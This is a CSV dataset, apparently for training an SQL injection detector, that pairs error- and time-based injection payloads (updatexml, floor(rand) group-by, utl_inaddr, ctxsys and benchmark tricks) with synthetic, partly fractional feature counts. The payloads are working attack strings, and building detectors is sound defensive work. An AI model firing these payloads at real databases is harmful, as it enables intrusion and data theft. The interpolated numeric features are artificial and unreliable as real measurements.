id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000025,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000092,0.0009265335223490262,133.0,28.0,3.7238337930569876,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000026,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000018,0.7875556707339154,134.46029230889144,37.08932951710618,4.242522785197382,70.92431520625435,1.0,44.4019828269778,18.13399427565927,0.5297491631485086,0.007634775788658316,0.32787510632547895,0.1347409547373541,3.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.089329517106179,0.0,5.522332379276545,0.0,2.000000000000001,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",nearest_attack_euclidean,R000240,1.1562211624059204,142.46680614310856,26.91434548990367,3.729374996497492,35.55246065320489,39.0,49.63811516330122,18.276230326602445,0.24936706483856536,0.27390277663262197,0.3485350520501374,0.12819510647867527,0.0,0.0,1.2762303266024464,-1.3877787807814457e-17,0.0,1.0,0.0,10.0,0.0,0.0,6.0,2.2762303266024473,0.0,0.0,0.6381151633012232,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R000237,1.6691432815780343,291.73865525153985,38.053034500342186,3.963781025702263,99.15910350102655,55.0,106.57955175051328,31.0,0.33981250353901965,0.18856970949671942,0.3653330416115645,0.10628474535269641,0.0,0.0,0.0,-1.3877787807814457e-17,2.0,1.0,0.0,20.0,0.0,0.0,6.473482749828907,4.0,0.0,0.0,-2.7755575615628914e-17,0.5265172501710922,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.0,0.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.526517250171093
SMOTE_000029,attack,error,"-9096""  )   where 9452  =  9452 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",nearest_attack_euclidean,R000258,0.21564450679513164,433.2993808193763,34.486625387958426,3.4973538682064866,107.91975232775056,62.0,190.8930031036674,72.48662538795843,0.24901993711255477,0.14313094646822025,0.4405290744942615,0.16732004192496347,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,39.486625387958426,0.0,0.0,0.0,32.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000030,attack,error,1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',nearest_attack_euclidean,R000281,0.707902628801672,375.59796552685486,32.51399507526498,3.3840307137656893,90.0,51.055980301059904,171.78498768816246,62.756997537632486,0.2396803636287495,0.13581902165886,0.4573901203431357,0.1671104943692548,2.486004924735023,0.0,0.0,-1.3877787807814457e-17,0.0,2.7569975376324884,0.0,34.0,0.0,0.0,0.0,24.270992612897466,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.7569975376324884,0.0,0.7569975376324884,-1.1102230246251565e-16,1.2430024623675116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.756997537632488
SMOTE_000031,attack,error,"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",nearest_attack_euclidean,R000072,0.5644797293353481,415.48719050479895,35.57593773113838,3.534084942411227,111.32479366986595,53.15187546227676,180.85864591037944,70.15187546227676,0.26748026530550356,0.1278968753178009,0.4357631943819947,0.16885966499470093,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,37.717291820758916,0.0,0.0,0.0,28.151875462276756,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.85864591037946,0.0,0.0,1.7172918207589194,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1413540896205402,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.71729182075892
SMOTE_000032,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",nearest_attack_euclidean,R000124,0.9322060813767953,344.39384470823455,39.32576941147068,3.9247777731587368,113.0,57.60615529176543,134.1134588279398,39.67423058852932,0.3281519263129351,0.16740773785663635,0.38924133362959806,0.11519900220083047,4.0,0.0,0.0,-1.3877787807814457e-17,2.0,1.325769411470679,0.0,24.696922354117284,0.0,0.0,6.0,4.977308234412037,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.325769411470679,3.0,0.3257694114706789,1.0,0.674230588529321,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.325769411470679
SMOTE_000033,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000119,0.06493880571487977,133.05980180561184,27.0,3.69578076481837,56.0,13.940198194388152,51.11960361122369,12.0,0.42086748666993234,0.10477715250857245,0.3841694708207954,0.09018589000069979,0.0,0.0,1.9601321295921026,1.0,0.0,1.0,0.0,8.039867870407898,0.0,0.0,0.0,3.960132129592102,0.0,0.0,0.9800660647960511,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000034,attack,error,"-1000"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""isbq""  =  ""isbq",nearest_attack_euclidean,R000305,1.4232598035764201,355.33818431775876,34.66181568224126,3.5110478746679306,89.15453920560316,49.66181568224126,155.35273727103495,61.169092158879366,0.2509853502939259,0.13979444180975956,0.4370870041206034,0.17213320377571112,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.5845460794396846,0.0,31.16909215887937,0.0,0.0,0.4154539205603158,23.584546079439683,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4154539205603155,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000035,attack,error,"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000054,0.4058353268539641,179.78103565696387,33.39051782848194,3.8716157109709313,44.0,47.0,66.08577674272291,22.695258914240974,0.2448067713439654,0.2614981421174176,0.367489419775054,0.12620566676356296,0.0,0.8476294571204853,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.847629457120487,0.0,0.0,6.0,4.0,0.0,0.8476294571204853,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000078,0.060562190184090946,283.0871470212818,35.09128529787182,3.960322173927412,108.0,35.0,104.26971761702545,35.817429404256366,0.38154862909557885,0.12365001868838203,0.36828479189370616,0.12651656032233297,0.0,4.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,19.817429404256362,0.0,2.0,5.0,4.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000037,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000053,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000038,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000291,0.5348597675042321,158.0,34.0,3.7566575078361253,50.0,23.0,64.0,21.0,0.31645569620253167,0.14556962025316456,0.4050632911392405,0.13291139240506328,0.16627264139415887,0.8337273586058412,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,14.0,1.0,0.0,4.0,0.0,0.16627264139415876,0.8337273586058412,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,error,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R000139,0.7100821781547941,308.6498291268669,40.76070208049049,4.101955320815445,117.08561664392394,43.0,109.52140416098098,39.04280832196197,0.3792740355232222,0.13936991640363883,0.3549216668201548,0.12643438125298417,3.521404160980984,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,20.0,0.0,2.0,5.0,7.521404160980984,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.7607020804904919,4.0,0.0,1.0,2.760702080490492,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.760702080490493
SMOTE_000040,attack,error,"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000173,0.6403124387854007,135.3013108899408,26.3013108899408,3.6911487545193076,31.0,39.0,46.99999999999999,18.3013108899408,0.2291208803056555,0.2882488494167924,0.34737681852792934,0.13525345174962275,0.30131088994080035,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.0,0.0,0.0,7.0,1.0,0.30131088994080046,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000087,1.3384366027666719,154.7495094314909,28.828033018404543,3.776090867724806,44.70278773415,36.56262264212727,54.87475471574545,18.609344339468183,0.2878313498845618,0.23753906255216573,0.3542242005657976,0.12040538699747483,0.6093443394681816,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.609344339468182,0.0,0.0,5.390655660531818,1.0,0.6093443394681816,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.3906556605318184,0.6093443394681816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",nearest_attack_euclidean,R000155,0.43461889355588595,183.24243598811586,31.559289303572776,3.6975970588095364,61.79644651786387,24.0,74.47431442858219,22.971675041669805,0.3373468178053626,0.13224347720340712,0.40530737333178285,0.12510233165944745,0.0,3.5592893035727737,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,15.412385738097033,0.0,0.0,4.0,0.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,-2.220446049250313e-16,0.0,0.0,-1.1102230246251565e-16,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8530964345242573
SMOTE_000043,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000087,0.6198785642393086,156.19939670899404,29.0,3.814422666696079,43.45850414005567,39.0,54.30566942670378,19.43522314223459,0.2775900154388905,0.25031157385909386,0.3476555625429452,0.12444284815907042,0.7176115711172969,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,10.717611571117295,0.0,0.0,6.0,1.0,0.717611571117297,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000113,0.0030384658077590603,133.0,29.0,3.7508000026142194,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000045,attack,error,"1'+  (  select vvet where 5221  =  5221 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",nearest_attack_euclidean,R000302,1.4839013152780485,206.2269463078631,32.80367449652679,3.668379463805544,58.20244966435119,36.80979865740476,84.80979865740477,26.40489932870238,0.2827602565531169,0.17797394527117727,0.41137812835884013,0.12788766981686578,1.6012248321755953,0.0,0.0,-1.3877787807814457e-17,1.0,1.6012248321755953,0.0,15.601224832175596,0.0,0.0,4.0,3.803674496526786,1.0,0.0,-2.7755575615628914e-17,0.3987751678244047,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.6012248321755953,0.0,0.6012248321755952,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.202449664351191
SMOTE_000046,attack,error,"1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",nearest_attack_euclidean,R000138,0.5631060711921394,337.7774112503704,41.554822500740755,4.04559305740788,113.77741125037038,63.0,124.0,37.0,0.33684037820731977,0.18651364362919132,0.36710621920666225,0.10953975895682665,2.0,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,22.0,0.0,0.0,6.0,7.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,3.0,1.0,1.0,0.7774112503703778,0.22258874962962213,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,15.0
SMOTE_000047,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R000205,1.6331516849456489,360.7665253673266,35.44860522363861,3.5891885598391524,94.89721044727722,52.58884178910886,153.4860522363861,59.794420894554435,0.2632388867228291,0.14556558352321697,0.4254538273720662,0.16574170238188776,1.4486052236386078,0.0,0.0,-1.3877787807814457e-17,0.0,2.4486052236386078,0.0,31.44860522363861,0.0,0.0,1.0,23.345815670915822,1.0,0.0,-2.7755575615628914e-17,0.5513947763613921,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.4486052236386078,0.0,0.44860522363860783,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.8972104472772156
SMOTE_000048,attack,error,"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",nearest_attack_euclidean,R000162,0.7420070881252414,321.1350054094121,38.60259299328978,4.03080964961518,111.20518598657958,57.41037197315913,116.3142614630938,36.205185986579565,0.3465736949705326,0.17860384448488204,0.36213219532686336,0.11269026521772206,4.0,0.0,0.0,-1.3877787807814457e-17,2.0,2.0,0.0,20.602592993289782,0.0,0.0,6.0,5.602592993289782,1.0,0.0,-2.7755575615628914e-17,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.301296496644891,3.0,0.30129649664489133,1.0,1.6987035033551088,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.301296496644891
SMOTE_000049,attack,error,"-7388""  )   as rlth where 5746  =  5746 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000224,0.12376183478911215,368.2832387591379,36.326176965591124,3.6161226488249114,91.0,60.0,155.95706179354676,61.32617696559113,0.24711192130648305,0.16293093712515366,0.42343621974780526,0.16652092182055803,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,3.0,0.0,31.326176965591124,0.0,0.0,1.0,26.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
